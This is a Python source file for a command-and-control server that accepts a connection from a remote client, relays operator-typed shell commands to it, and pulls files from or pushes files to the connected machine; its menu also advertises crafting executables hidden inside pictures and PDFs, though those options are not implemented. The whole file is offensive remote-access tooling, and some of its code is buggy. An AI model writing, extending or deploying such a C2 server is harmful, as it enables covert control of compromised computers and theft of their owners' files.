import socket
import os
from time import sleep


class server:
    server_socket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    def download(self,file_name):
        response = self.server_socket.recv(2048)
        total_response=""
        if response.decode().startswith("Yes"):
            response=response.decode().replace("Yes","")
            total_response+=response
            print("Downloading file...\n")
            if total_response.endswith("ENDOFMESSAGE"):
                total_response=total_response.replace("ENDOFMESSAGE", "")       
                exit
            else:
                while True:
                    response = self.server_socket.recv(2048)
                    total_response+=response.decode()
                    if total_response.endswith("ENDOFMESSAGE"):
                        total_response=total_response.replace("ENDOFMESSAGE", "")       
                        break

            with open(file_name,"xb") as file:
                file.write(total_response.encode())
                print("File downloaded successfully.\n")
                file.close()

        else:
            print("File does not exist!Try again...\n")
            exit

    def upload (self,path_input):
        if os.path.exists(path_input):
            chunk_read = "Yes"
            with open(path_input,"rb") as file:
                chunk = file.read(2048).decode()
                chunk_read+=chunk
                while len(chunk) >0:
                    chunk=file.read(2048).decode()    
                    chunk_read+=chunk          
                chunk_read+="ENDOFMESSAGE"
                chunk_Byte=chunk_read.encode()
                self.server_socket.sendall(chunk_Byte)
                file.close()
                

    def server_c2(self,server_ip,server_port,client_num):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_socket.bind((server_ip,server_port))
        self.server_socket.listen(client_num)
        print("Listening for incoming connections...\n")
        self.server_socket, client_address = self.server_socket.accept()
        print("IP:{} Connected successfully!\n".format(client_address))
        try:
            while True:
                command = input("Enter command:\n")
                self.server_socket.send(command.encode())

                if command=="Exit":
                    self.server_socket.close()
                    return
                
                elif command.startswith("cd"):
                    continue #Because cd doesn't return any output

                elif command.startswith("download"):
                    file_path = command.strip("download ")
                    file_name_with_ext = os.path.basename(file_path)
                    file_name="./Downloads/"+file_name_with_ext
                    if not os.path.exists("./Downloads"):
                        os.makedirs("./Downloads")
                    while os.path.exists(file_name):
                        file_name+="(1)"
                    self.download(self,file_name)
                    continue

                elif command.startswith("upload"):
                    path_input=command.strip("upload ")
                    self.upload(self,path_input)
                    continue


                total_response=""
                while True:
                    response = self.server_socket.recv(2048)
                    total_response+=response.decode()
                    if total_response.endswith("ENDOFMESSAGE"):
                        total_response=total_response.replace("ENDOFMESSAGE", "")
                        break
                print(total_response+"\n")
                sleep(1)
        except Exception: print("Exception occured")
        self.server_socket.close()
        exit





if __name__=="__main__":

    print("1.Start a C2 server\n2.Craft executable inside a picture\n3.Craft executable inside a PDF\n")


    # If option was 1:
   # input_ip=input("Enter the IP address:\n")
    #input_port=input("Enter the port:\n")
    server_init = server
    #server_init.server_c2(server_init,input_ip,int(input_port),10)
    server_init.server_c2(server_init,"127.0.0.1",int(8000),10)